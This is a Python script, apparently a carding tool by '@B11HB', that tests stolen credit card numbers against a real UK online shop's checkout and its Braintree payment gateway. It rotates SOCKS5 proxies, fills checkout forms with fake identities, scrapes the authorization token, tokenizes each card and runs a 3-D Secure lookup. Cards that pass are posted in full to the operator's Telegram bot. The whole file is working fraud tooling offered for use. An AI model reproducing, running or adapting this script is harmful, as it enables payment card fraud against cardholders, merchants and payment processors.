import requests, random, string, bs4, base64
from bs4 import BeautifulSoup
import time, uuid, json, re

O = '\033[1;31m'  # Red
Z = '\033[1;37m'  # White
F = '\033[1;32m'  # Green
B = '\033[2;36m'  # Light Blue
X = '\033[1;33m'  # Yellow
C = '\033[2;35m'  # Purple

print(X+'________________________________________________')
print(Z+'''\nCheker Brantree LookUp | Dev:@B11HB''')
print(X+'________________________________________________')

file = input(B+'YOUR FILE CC NAME : ')
tokbot = input('TOKEN YOUR BOT : ')
idbot = input('ID : ')
file = open(file, "+r")
start_num = 0

# حمل البروكسيات من ملف خارجي
with open("proxies.txt") as pf:
    proxies_list = [line.strip() for line in pf if line.strip()]

for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')

    # اختار بروكسي عشوائي من الملف
    proxy = random.choice(proxies_list)
    ip, port = proxy.split(":")
    proxy_url = f"socks5h://{ip}:{port}"
    proxies = {
        "http": proxy_url,
        "https": proxy_url
    }

    r = requests.Session()

    emails = [
        "karmnil2004@gmail.com",
        "karmnil2007@gmail.com",
        "karmnil2001@gmail.com",
        "karmnil2008@gmail.com",
        "karmnil2011@gmail.com",
        "faolmj@telegmail.com",
        "gdfvenc@telegmail.com",
        "gpwlzz@telegmail.com",
        "koher@telegmail.com",
        "fwpyvn@telegmail.com",
    ]
    email = random.choice(emails)

    headers = {
        'authority': 'www.stickandcaneshop.co.uk',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.stickandcaneshop.co.uk',
        'referer': 'https://www.stickandcaneshop.co.uk/index/action/basket/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'c': '56134',
        'quantity': '0',
        'silent': '1',
    }

    data = {
        'addajax': '1',
    }

    response = r.post(
        'https://www.stickandcaneshop.co.uk/index/action/basket/',
        params=params,
        headers=headers,
        data=data,
        proxies=proxies
    )

    headers = {
        'authority': 'www.stickandcaneshop.co.uk',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.stickandcaneshop.co.uk',
        'referer': 'https://www.stickandcaneshop.co.uk/velcro-strap-for-folding-sticks',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'quantity': '1',
        'action': 'add',
        'pid': '3919',
        'sku': 'WR17',
        'frequency': '',
        'csrf_token': '2b4f9e0bfe518733c2132b6414cf64b8',
        'addajax': '1',
    }

    responise = r.post(
        'https://www.stickandcaneshop.co.uk/velcro-strap-for-folding-sticks',
        headers=headers,
        data=data,
        proxies=proxies
    )

    soup = BeautifulSoup(responise.text, 'html.parser')
    quantity = soup.find('td', style="text-align: right").text.strip()

    headers = {
        'authority': 'www.stickandcaneshop.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.stickandcaneshop.co.uk',
        'referer': 'https://www.stickandcaneshop.co.uk/checkout',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'email': email,
        'title': '0',
        'firstname': 'Ali',
        'lastname': 'Karar',
        'companyname': '',
        'address1': '4003 Ge',
        'address2': '',
        'towncity': 'TR',
        'county': 'Tennessee',
        'postcode': 'SW6 3ZA',
        'country': 'GB',
        'telephone': '1 504-843-4807',
        'vatnum': '',
        'eori': '',
        'ukims': '',
        'message': 'jsjwjj',
        'alt_title': '0',
        'alt_firstname': '',
        'alt_lastname': '',
        'alt_companyname': '',
        'alt_address1': '',
        'alt_address2': '',
        'alt_towncity': '',
        'alt_county': '',
        'alt_postcode': '',
        'alt_country': 'GB',
        'alt_telephone': '',
        'delivery': '75',
        'safeplace': 'jkoppp',
        'message_disabled': '1',
        'personal_information': 'x',
        'noaccount': 'x',
        'nosubmit': '0',
        'remove': '0',
    }

    riie = r.post('https://www.stickandcaneshop.co.uk/checkout', headers=headers, data=data, proxies=proxies)
    m = re.search(r"authorization:\s*'([^']+)'", riie.text)
    if m:
        token = m.group(1)
        try:
            decoded = base64.b64decode(token).decode()
            data = json.loads(decoded)
            au = data.get("authorizationFingerprint")
        except Exception as e:
            print("Erorr", e)
    else:
        print("No AU.")
        continue

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies)
    tok = response.json()['data']['tokenizeCreditCard']['token']
    binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']

    headers = {
        'authority': 'api.braintreegateway.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://www.stickandcaneshop.co.uk',
        'referer': 'https://www.stickandcaneshop.co.uk/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'amount': 2.99,
        'bin': binn,
        'authorizationFingerprint': au,
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.94.0',
        },
    }

    resi = r.post(
        f'https://api.braintreegateway.com/merchants/gvn3nxg22cvyzsz4/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
        headers=headers,
        json=json_data,
        proxies=proxies
    )

    vbv = resi.json()['paymentMethod']['threeDSecureInfo']['status']

    if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
        print(F + f'[{start_num}]', P, '|', 'PASSED ✅ ')
        requests.post(
            f"https://api.telegram.org/bot{tokbot}/sendmessage",
            params={
                "chat_id": idbot,
                "text": f"""APPROVED ✅

[♡] 𝗖𝗖 : {P} 
[♕] 𝗚𝗔𝗧𝗘𝗦 : Brantree LookUp
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : PASSED ⚡
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@B11HB』"""
            })
    else:
        print(O + f'[{start_num}]', P, '|', vbv)

    time.sleep(4)
